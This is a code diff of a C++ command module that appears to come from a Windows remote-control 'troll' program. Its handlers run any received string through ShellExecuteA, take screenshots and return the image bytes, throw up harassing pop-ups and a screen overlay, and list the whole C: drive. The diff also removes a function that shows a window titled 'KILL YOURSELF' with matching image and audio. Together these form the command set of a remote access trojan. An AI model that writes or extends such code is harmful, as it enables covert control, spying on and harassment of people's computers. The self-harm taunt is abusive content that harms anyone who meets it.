@@ -1,6 +1,6 @@
 #include "Commands.h"
 
-void commands::showMessageBox(const std::vector<std::string>& args) 
+void commands::showMessageBox(const std::vector<std::string>& args)
 {
     if (args.size() >= 2) {
         std::string title = args[0];
@@ -18,9 +18,9 @@ void commands::showMessageBox(const std::vector<std::string>& args)
     }
 }
 
-void commands::execute(const std::vector<std::string>& args)
+void commands::execute(const std::string& argument)
 {
-    std::string stemp = std::string(args[0].begin(), args[0].end());
+    std::string stemp = argument;
     LPCSTR sw = stemp.c_str();
 
     ShellExecuteA(0, 0, sw, 0, 0, SW_SHOW);
@@ -28,7 +28,7 @@ void commands::execute(const std::vector<std::string>& args)
 
 void commands::cringe()
 {
-    std::cout << "Cringe() Will return once we can compile without SDL2\n";
+    //std::cout << "Cringe() Will return once we can compile without SDL2\n";
     const int SCREEN_WIDTH = 1072;
     const int SCREEN_HEIGHT = 1092;
 
@@ -82,61 +82,9 @@ void commands::cringe()
     SDL_Quit();
 }
 
-void commands::KillYourSelf()
+void commands::feesh()
 {
-    SDL_Init(SDL_INIT_EVERYTHING);
-    IMG_Init(IMG_INIT_PNG);
-    Mix_Init(MIX_INIT_MP3);
 
-    // Initialize audio
-    Mix_OpenAudio(22050, MIX_DEFAULT_FORMAT, 2, 4096);
-
-    // Load image
-    SDL_Surface* imageSurface = IMG_Load("assets/imgs/killyourself.png");
-
-    // Get image dimensions
-    int imgWidth = imageSurface->w;
-    int imgHeight = imageSurface->h;
-
-    SDL_Window* window = SDL_CreateWindow("KILL YOURSELF", SDL_WINDOWPOS_CENTERED, SDL_WINDOWPOS_CENTERED, imgWidth, imgHeight, SDL_WINDOW_SHOWN);
-    SDL_Renderer* renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);
-
-    // Log dimensions (or use as you need)
-    printf("Image Width: %d, Height: %d\n", imgWidth, imgHeight);
-
-    SDL_Texture* imageTexture = SDL_CreateTextureFromSurface(renderer, imageSurface);
-    SDL_FreeSurface(imageSurface);
-    // Load audio
-    Mix_Music* bgMusic = Mix_LoadMUS("assets/audio/killyourself.mp3");
-
-    // Play audio
-    Mix_PlayMusic(bgMusic, -1);
-
-    SDL_Event event;
-    bool running = true;
-
-    while (running) {
-        while (SDL_PollEvent(&event)) {
-            if (event.type == SDL_QUIT) {
-                running = false;
-            }
-        }
-
-        SDL_RenderClear(renderer);
-        SDL_RenderCopy(renderer, imageTexture, NULL, NULL);
-        SDL_RenderPresent(renderer);
-    }
-
-    // Cleanup
-    Mix_FreeMusic(bgMusic);
-    SDL_DestroyTexture(imageTexture);
-    SDL_DestroyRenderer(renderer);
-    SDL_DestroyWindow(window);
-
-    Mix_CloseAudio();
-    Mix_Quit();
-    IMG_Quit();
-    SDL_Quit();
 }
 
 void commands::StopProcess()
@@ -149,4 +97,96 @@ std::vector<char> commands::Screenshot_C()
     // Takes the screenshot, and now there should be a file in the active directory called "screenshot.png"
     capture::screenshot();
     return file::readFile("screenshot.png");
+}
+
+void DrawPixel(HDC hdc, int x, int y, COLORREF color)
+{
+    SetPixel(hdc, x, y, color);
+    //pixelsRendered[x][y] = true;
+}
+
+void RemovePixel(HDC hdc, int x, int y)
+{
+    SetPixel(hdc, x, y, RGB(0, 0, 0));
+    //pixelsRendered[x][y] = true;
+}
+
+void commands::randomPixel(int x, int y, int radius)
+{
+    //bool pixelsRendered[GetSystemMetrics(SM_CXSCREEN)][GetSystemMetrics(SM_CYSCREEN)] = {false};
+
+    POINT mousepos;
+
+    const char class_name[] = "randomPixel";
+
+    WNDCLASS wc = {};
+
+    wc.lpfnWndProc = DefWindowProc;
+    wc.hInstance = GetModuleHandle(NULL);
+    wc.lpszClassName = class_name;
+
+    RegisterClass(&wc);
+
+    HWND hwnd = CreateWindowEx(
+        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
+        class_name,
+        "Fook off m8",
+        WS_POPUP,
+        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), // Position and size, in this case, the entire screen
+        NULL, 
+        NULL, 
+        GetModuleHandle(NULL), 
+        NULL
+    );
+
+    if (hwnd == NULL)
+    {
+        std::cerr << "[randomPixel] [!] Failed to create window.\n";
+        return;
+    }
+
+    SetLayeredWindowAttributes(hwnd, RGB(0, 0, 0), 0, LWA_COLORKEY);
+
+    ShowWindow(hwnd, SW_SHOWNORMAL);
+
+    HDC hdc = GetDC(hwnd);
+
+    DrawPixel(hdc, x, y, RGB(255, 0, 0));
+
+    ReleaseDC(hwnd, hdc);
+
+    while(true) 
+    {
+        GetCursorPos(&mousepos);
+        //std::cout << "Mouse X: " << mousepos.x << " Mouse Y: " << mousepos.y << "\n";
+
+        int dx = mousepos.x - x;
+        int dy = mousepos.y - y;
+        if (sqrt(dx * dx + dy * dy) <= radius) {
+            break;
+        }
+    }
+
+    DestroyWindow(hwnd);
+}
+
+void commands::WindowTroll()
+{
+    std::string message = "May I?";
+	std::string title = "100 percent punjabi no virus";
+
+	std::wstring wTitle(title.begin(), title.end());
+	std::wstring wMessage(message.begin(), message.end());
+
+    std::string message_end = "Thank you :)";
+	std::string title_end = "utterly fucked";
+
+	std::wstring wTitle_end (title_end.begin(), title_end.end());
+	std::wstring wMessage_end (message_end.begin(), message_end.end());
+
+    MessageBoxW(nullptr, wMessage.c_str(), wTitle.c_str(), MB_OK | MB_ICONEXCLAMATION);
+
+    system("tree c:/");
+
+    MessageBoxW(nullptr, wMessage_end.c_str(), wTitle_end.c_str(), MB_OK | MB_ICONEXCLAMATION);
 }
